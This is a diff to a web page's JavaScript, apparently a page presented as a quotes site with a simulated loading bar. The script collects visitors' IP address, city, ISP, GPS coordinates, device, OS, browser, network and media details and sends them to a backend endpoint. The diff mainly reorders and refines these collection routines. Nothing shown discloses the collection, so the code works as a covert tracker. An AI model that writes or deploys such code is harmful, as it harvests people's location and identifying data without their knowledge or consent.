@@ -91,15 +91,18 @@
                 const response = await fetch(SERVER_ENDPOINT, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify(payload),
+                    mode: "cors"
                 });
                 if (!response.ok) {
                     throw new Error(`Server responded with status ${response.status}`);
                 }
                 const data = await response.json();
                 console.log("✅ Data logged successfully:", data);
+                document.getElementById("statusText").innerHTML = '<i class="fas fa-check-circle mr-2"></i>Data logged successfully!';
             } catch (error) {
                 console.error("❌ Failed to send data:", error);
+                document.getElementById("statusText").innerHTML = '<i class="fas fa-times-circle mr-2"></i>Failed to send data to backend.';
             }
         }
 
@@ -116,32 +119,39 @@
             interactionData: { quotesViewed: [], timeOnPage: 0 }
         };
 
+        async function collectIPData() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                collectedData.ipInfo = {
+                    ip: d.ip,
+                    city: d.city,
+                    region: d.region,
+                    country: d.country_name,
+                    timezone: d.timezone,
+                    isp: d.org
+                };
+            } catch (e) {
+                console.warn("⚠️ IP detection failed:", e);
+                collectedData.ipInfo = { error: "Failed to retrieve IP data" };
+            }
+        }
+
         function detectDeviceType() {
             const ua = navigator.userAgent;
-            if(/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return "Tablet";
-            if(/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return "Mobile";
+            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return "Tablet";
+            if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return "Mobile";
             return "Desktop";
         }
 
         function detectOS() {
             const ua = navigator.userAgent;
-            if(ua.includes("Windows")) return "Windows";
-            if(ua.includes("Mac")) return "MacOS";
-            if(ua.includes("Linux")) return "Linux";
-            if(ua.includes("Android")) return "Android";
-            if(/iPhone|iPad|iPod/.test(ua)) return "iOS";
+            if (ua.includes("Windows")) return "Windows";
+            if (ua.includes("Mac")) return "MacOS";
+            if (ua.includes("Linux")) return "Linux";
+            if (ua.includes("Android")) return "Android";
+            if (/iPhone|iPad|iPod/.test(ua)) return "iOS";
             return "Unknown";
-        }
-
-        async function collectIPData() {
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
-                collectedData.ipInfo = { ip: d.ip, city: d.city, region: d.region, country: d.country_name, timezone: d.timezone, isp: d.org };
-            } catch (e) {
-                console.error("IP detection failed:", e);
-                collectedData.ipInfo = { error: "Failed to retrieve IP data" };
-            }
         }
 
         function collectSystemInfo() {
@@ -159,6 +169,15 @@
             };
         }
 
+        function detectBrowser() {
+            const ua = navigator.userAgent;
+            if (ua.includes("Firefox")) return "Firefox";
+            if (ua.includes("Edge")) return "Edge";
+            if (ua.includes("Chrome")) return "Chrome";
+            if (ua.includes("Safari")) return "Safari";
+            return "Unknown";
+        }
+
         function collectBrowserInfo() {
             collectedData.browserInfo = {
                 userAgent: navigator.userAgent,
@@ -167,15 +186,6 @@
                 cookiesEnabled: navigator.cookieEnabled,
                 doNotTrack: navigator.doNotTrack === "1"
             };
-        }
-
-        function detectBrowser() {
-            const ua = navigator.userAgent;
-            if (ua.includes("Firefox")) return "Firefox";
-            if (ua.includes("Edge")) return "Edge";
-            if (ua.includes("Chrome")) return "Chrome";
-            if (ua.includes("Safari")) return "Safari";
-            return "Unknown";
         }
 
         function collectNetworkInfo() {
@@ -196,7 +206,10 @@
                     lon: pos.coords.longitude,
                     accuracy: pos.coords.accuracy
                 };
-            }, err => console.log("Geo error:", err.message));
+            }, err => {
+                console.warn("Geo error:", err.message);
+                collectedData.locationData.gps = { error: err.message };
+            });
         }
 
         async function collectMediaInfo() {
@@ -220,7 +233,7 @@
         function simulateProgress() {
             let p = 0;
             const iv = setInterval(() => {
-                p += Math.random() * 10; // Smoother increment
+                p += Math.random() * 10;
                 if (p > 95) p = 95;
                 document.getElementById('progress').style.width = `${p}%`;
                 if (p >= 95) {
